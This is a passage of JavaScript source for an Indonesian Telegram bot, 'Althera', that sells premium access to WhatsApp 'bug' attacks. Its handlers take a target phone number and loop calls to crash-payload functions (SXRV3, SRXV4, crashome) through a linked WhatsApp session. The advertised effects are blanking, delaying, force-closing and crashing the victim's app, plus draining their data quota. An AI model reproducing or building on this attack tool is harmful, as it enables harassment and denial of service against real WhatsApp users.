      sentMenu.message_id
    );

  } catch (error) {
    console.error(
      "Start Command Error:",
      error.message
    );

    await bot.sendMessage(
      chatId,
      "Gagal membuka Action Center. Silakan coba lagi."
    ).catch(() => {});
  }
});


// ================================================
// CALLBACK — MENU NAVIGATION
// ================================================

bot.on("callback_query", async (query) => {
  if (!query.message) {
    await bot.answerCallbackQuery(query.id).catch(() => {});
    return;
  }

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  const senderId = query.from.id;
  const userKey = String(senderId);

  try {
    const role = getUserRole(senderId);

    // ============================================
    // CEK CHANNEL SETIAP TOMBOL DITEKAN
    // ============================================

    const channelAccess = await checkRequiredChannels(
      senderId
    );

    // ============================================
    // BUTTON: SUDAH JOIN
    // ============================================

    if (data === "check_required_channels") {
      // Bot gagal memeriksa status channel.
      if (channelAccess.errors.length > 0) {
        await bot.answerCallbackQuery(query.id, {
          text: "⚠️ Gagal memverifikasi channel. Coba lagi nanti.",
          show_alert: true
        }).catch(() => {});

        // Pesan verifikasi tidak dihapus.
        return;
      }

      // Belum join: hanya popup.
      // Jangan hapus pesan atau mengirim prompt duplikat.
      if (!channelAccess.joined) {
        await bot.answerCallbackQuery(query.id, {
          text: "⛔ Kamu belum bergabung ke semua channel!",
          show_alert: true
        }).catch(() => {});

        return;
      }

      // ==========================================
      // VERIFIKASI BERHASIL
      // ==========================================

      markChannelVerified(senderId);

      await bot.answerCallbackQuery(query.id).catch(() => {});

      // Hapus Action Center lama hanya di chat ini
      // setelah verifikasi berhasil.
      await removeStartMenu(
        senderId,
        chatId
      );

      // Hapus semua prompt verifikasi di chat ini.
      await removeJoinPrompts(
        senderId,
        chatId
      );

      // Hapus juga pesan prompt yang sedang ditekan.
      await bot.deleteMessage(
        chatId,
        messageId
      ).catch(() => {});

      // Hanya kirim satu pesan ini.
      await bot.sendMessage(
        chatId,
        "✅ Verifikasi berhasil. Silakan ketik /start kembali."
      );

      return;
    }


    // ============================================
    // USER KELUAR / BELUM JOIN, TAPI MENEKAN MENU
    // ============================================

    if (!channelAccess.joined) {
      // Status tidak bisa diverifikasi.
      if (channelAccess.errors.length > 0) {
        await bot.answerCallbackQuery(query.id, {
          text: "⚠️ Gagal memverifikasi channel. Coba lagi nanti.",
          show_alert: true
        }).catch(() => {});

        return;
      }

      const wasVerified =
        verifiedChannelUsers.has(userKey);

      // Popup untuk tombol selain Sudah Join.
      await bot.answerCallbackQuery(query.id, {
        text: wasVerified
          ? "⚠️ Terdeteksi Keluar Dari Channel"
          : "⛔ Kamu belum bergabung ke semua channel!",
        show_alert: true
      }).catch(() => {});

      // Hanya hapus menu jika user pernah terverifikasi
      // dan sekarang terdeteksi sudah keluar.
      if (wasVerified) {
        await removeStartMenu(
          senderId,
          chatId
        );
      }

      // Hapus menu yang tombolnya sedang ditekan.
      await bot.deleteMessage(
        chatId,
        messageId
      ).catch(() => {});

      // Kirim prompt baru di chat yang sama.
      await showJoinPrompt(
        chatId,
        channelAccess,
        wasVerified ? "left" : "initial",
        senderId
      );

      return;
    }

    // User masih join semua channel.
    markChannelVerified(senderId);


    // ============================================
    // ROLE GATE — MENU UTAMA
    // ============================================

    if (
      data === "open_main_menu" &&
      role === "Free"
    ) {
      await bot.answerCallbackQuery(query.id, {
        text: "⛔ Akses menu hanya untuk Premium, Admin, dan Owner.\nHubungi @ridzzhalutrs untuk mendapatkan akses.",
        show_alert: true
      }).catch(() => {});

      return;
    }

    // Jawab callback untuk pengguna yang lolos.
    await bot.answerCallbackQuery(query.id).catch(() => {});


    // ============================================
    // TUJUAN ANIMASI LOADING
    // ============================================

    const destinations = {
      open_main_menu: "Menu Utama",
      back_to_main: "Menu Utama",
      tqto: "Thanks To",
      tools: "Tools",
      bug_show1: "Menu Bug V1",
      bug_show2: "Menu Bug V2",
      akses: "Akses Menu"
    };

    // Animasi loading pada foto/caption yang sama.
    if (destinations[data]) {
      await runProgressBar(
        chatId,
        destinations[data],
        messageId,
        true
      );
    }

    let caption = "";
    let replyMarkup = {};


    // ============================================
    // MENU UTAMA
    // ============================================

    if (
      data === "open_main_menu" ||
      data === "back_to_main"
    ) {
      caption = `
<blockquote><b>⌘ ALTHERA — MAIN MENU</b></blockquote>
Pilih menu yang ingin kamu jelajahi.

<blockquote>⌬ <b>AVAILABLE MENU</b>
⌑ 🛠 Tools — Alat yang berguna
⌑ 🐞 Bug — WhatsApp Bug
⌑ 🔐 Akses — Status dan akses pengguna (Owner Only)</blockquote>

Pilih salah satu opsi di bawah untuk melanjutkan.

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "𝑻𝒐𝒐𝒍𝒔",
              callback_data: "tools"
            },
            {
              text: "𝑩𝒖𝒈",
              callback_data: "bug_show1",
              style: "danger"
            }
          ],
          [
            {
              text: "𝑻𝒉𝒂𝒏𝒌𝒔",
              callback_data: "tqto",
              style: "primary"
            },
            {
              text: "𝑨𝒌𝒔𝒆𝒔",
              callback_data: "akses",
              style: "success"
            }
          ]
        ]
      };
    }


    // ============================================
    // THANKS TO
    // ============================================

    if (data === "tqto") {
      caption = `
<blockquote><b>⟡ ALTHERA — THANKS</b></blockquote>
Orang-orang di balik perjalanan dan perkembangan Althera.

<blockquote>⌬ <b>𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐</b>
⌑ @ridzzhalutrs – Developer
⌑ @ridzzhalutrs – Support
⌑ @ridzzhalutrs – Support
⌑ @ridzzhalutrs – Owner
⌑ @ridzzhalutrs – Moderator
⌑ @ridzzhalutrs – Moderator
⌑ @ridzzhalutrs – Partner</blockquote>

<i>Setiap kontribusi, bagian dari sebuah perjalanan.</i>

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "𝑩𝒂𝒄𝒌",
              callback_data: "back_to_main",
              style: "danger"
            }
          ]
        ]
      };
    }


    // ============================================
    // TOOLS MENU
    // ============================================

    if (data === "tools") {
      caption = `
<blockquote><b>⛭ ALTHERA TOOLS</b></blockquote>
Alat-alat Althera yang berguna untuk kehidupan sehari-hari. 

<blockquote>⌬ <b>TOOLS OVERVIEW</b>
⌑ /brat – Buat Stiker Brat
⌑ /cekkhodam – Cek Khodam
⌑ /cekganteng – Cek Ganteng
⌑ /quotesgalau – Kata-Kata Galau
⌑ /motivasi – Motivasi
⌑ /ascii – Buat ascii
⌑ /suit – Mini Games
⌑ /mute – Mute User (Group Only)
⌑ /unmute – Unmute User (Group Only)</blockquote>

Gunakan tools yang tersedia sesuai kebutuhanmu.

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "𝑩𝒂𝒄𝒌",
              callback_data: "back_to_main",
              style: "danger"
            }
          ]
        ]
      };
    }


    // ============================================
    // BUG MENU V1
    // ============================================

    if (data === "bug_show1") {
      caption = `
<blockquote><b>⌘ ALTHERA — BUG MENU</b></blockquote>
Ini adalah menu bug WhatsApp V1.

<blockquote>⌬ <b>Bug List</b>
⌑ /blank
↳ Blank Click
⌑ /delay
↳ Super Delay
⌑ /force
↳ Forclose Click
⌑ /crash
↳ Crash No Click</blockquote>

Gunakan dengan bertanggung jawab.

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "𝑩𝒂𝒄𝒌",
              callback_data: "back_to_main",
              style: "danger"
            },
            {
              text: "𝑩𝒖𝒈 𝑽2",
              callback_data: "bug_show2",
              style: "primary"
            }
          ]
        ]
      };
    }


    // ============================================
    // BUG MENU V2
    // ============================================

    if (data === "bug_show2") {
      caption = `
<blockquote><b>⌘ ALTHERA — BUG MENU</b></blockquote>
Ini adalah menu bug WhatsApp V2. 

<blockquote>⌬ <b>Bug List</b>
⌑ /buldozer
↳ Sedot Kuota
⌑ /twors
↳ Hard Blank
⌑ /lock
↳ Lock Chat
⌑ /envizib
↳ Delay Invisible</blockquote>

Gunakan dengan bertanggung jawab.

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "𝑩𝒂𝒄𝒌",
              callback_data: "bug_show1",
              style: "danger"
            }
          ]
        ]
      };
    }


    // ============================================
    // AKSES MENU
    // ============================================

    if (data === "akses") {
      caption = `
<blockquote><b>♙ ALTHERA — ACCESS CONTROL</b></blockquote>
Menu ini digunakan untuk menambah pengguna premium & admin, serta pembaruan sistem.

<blockquote>⌬ <b>ACCESS MENU</b>
⌑ /update – Update Script
⌑ /addprem - ID Durasi
⌑ /listprem - List Premium
⌑ /delprem - ID
⌑ /addadmin - ID
⌑ /deladmin - ID</blockquote>

Semua fitur pada menu ini dibatasi khusus untuk Owner.

<b>- while (true) { <i>𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠</i> }</b>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "𝑩𝒂𝒄𝒌",
              callback_data: "back_to_main",
              style: "danger"
            }
          ]
        ]
      };
    }


    // ============================================
    // UPDATE FOTO, CAPTION DAN BUTTON
    // ============================================

    if (caption) {
      await bot.editMessageMedia(
        {
          type: "photo",
          media: getRandomImage(),
          caption: caption,
          parse_mode: "HTML"
        },
        {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: replyMarkup
        }
      );
    }

  } catch (error) {
    console.error(
      "Callback Menu Error:",
      error.message
    );

    await bot.sendMessage(
      chatId,
      "Gagal membuka menu. Silakan coba lagi."
    ).catch(() => {});
  }
});

//=======CASE BUG=========//
// ==========================================
// 1. FUNGSI UI (CAPTION)
// ==========================================
function blankCaption(target, status, percent, efek = "blank") {
  const filled = Math.round(percent / 10);
  const bar = "▰".repeat(filled) + "▱".repeat(10 - filled);

  return `<blockquote><b>✦ ALTHERA — ${efek.toUpperCase()}</b></blockquote>

<blockquote>⌬ <b>TASK INFORMATION</b>
⌑ Target   : <code>${target}</code>
⌑ Efek     : ${efek}
⌑ Status   : ${status}
⌑ Progress : ${bar} ${percent}%</blockquote>

<b><i>— 𝑨𝒍𝒕𝒉𝒆𝒓𝒂 𝐽𝑠 • Task Center</i></b>`;
}

function privateAccessCaption() {
  return `<blockquote><b>✦ ALTHERA — PRIVATE ACCESS</b></blockquote>

𖤓 Interested in accessing the script?
Contact the owner below.

↳ <b>Owner:</b> @ridzzhalutrs

<b>ALTHERA</b> — <i>EST. 2025</i>`;
}

bot.onText(/\/blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "Blank"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/delay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "Delay Hard"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/force (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "forclose";

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/crash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "crash"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
      } catch {
        await bot.sendMessage(chatId, errorText);
      }
    } else {
      await bot.sendMessage(chatId, errorText);
    }
  }
});

bot.onText(/\/buldozer (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userKey = String(senderId);

  // ---- Channel Verification Gate ----
  const channelAccess = await checkRequiredChannels(senderId);

  if (!channelAccess.joined) {
    const wasVerified = verifiedChannelUsers.has(userKey);
    const reason = channelAccess.errors?.length
      ? "error"
      : wasVerified
        ? "left"
        : "initial";

    if (wasVerified) {
      await removeStartMenu(senderId);
    }

    return showJoinPrompt(chatId, channelAccess, reason);
  }

  // Simpan status pernah terverifikasi
  markChannelVerified(senderId);

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const efek = "Sedot Kuota"; //ganti aja sesuai efeknya

  // ---- Role Access Gate ----
  const role = getUserRole(senderId);

  if (role === "Free") {
    return bot.sendPhoto(chatId, randomImage, {
      caption: privateAccessCaption(),
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/ridzzhalutrs"
            }
          ]
        ]
      }
    });
  }

  // ---- Cooldown Gate ----
  const remainingTime = checkCooldown(senderId);

  if (remainingTime > 0) {
    return bot.sendMessage(
      chatId,
      `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`
    );
  }

  // ---- Session Gate ----
  if (!sessions || sessions.size === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
    );
  }

  const sock = [...sessions.values()][0].sock || [...sessions.values()][0];
  let sentMessage;

  try {
    sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: blankCaption(formattedNumber, "Initializing...", 0, efek),
      parse_mode: "HTML"
    });

    const stages = [
      { percent: 10, delay: 300 },
      { percent: 20, delay: 300 },
      { percent: 30, delay: 300 },
      { percent: 40, delay: 300 },
      { percent: 50, delay: 300 },
      { percent: 60, delay: 300 },
      { percent: 70, delay: 300 },
      { percent: 80, delay: 300 },
      { percent: 90, delay: 300 },
      { percent: 100, delay: 300 }
    ];

    for (const stage of stages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        blankCaption(
          formattedNumber,
          stage.percent === 100 ? "Executing Bug..." : "Processing...",
          stage.percent,
          efek
        ),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );
    }

    for (let i = 0; i <= 2; i++) {   
      await SXRV3(sock, jid);
      await SRXV4(sock, jid);
      await crashome(sock, jid);
      
      await new Promise(res => setTimeout(res, 2000)); // 2000 = 2 detik jeda per bug nya, ganti 1000 (1detik) untuk spam atau yang lainnya
    }
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `${blankCaption(formattedNumber, "Completed", 100, efek)}

<blockquote><b>✓ TASK FINISHED</b>
Proses ${efek} telah selesai.
<b>ALTHERA</b> — <i>EST. 2025</i></blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Cek Target",
              url: `https://wa.me/${formattedNumber}`
            }
          ]]
        }
      }
    );

  } catch (error) {
    console.error("[BLANK ERROR]", error);

    const errorText = "❌ Terjadi kesalahan saat menjalankan proses.";

    if (sentMessage) {
      try {
        await bot.editMessageCaption(
          blankCaption(formattedNumber, "Failed", 0, efek) + `\n\n<b>${errorText}</b>`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "HTML"
          }
        );
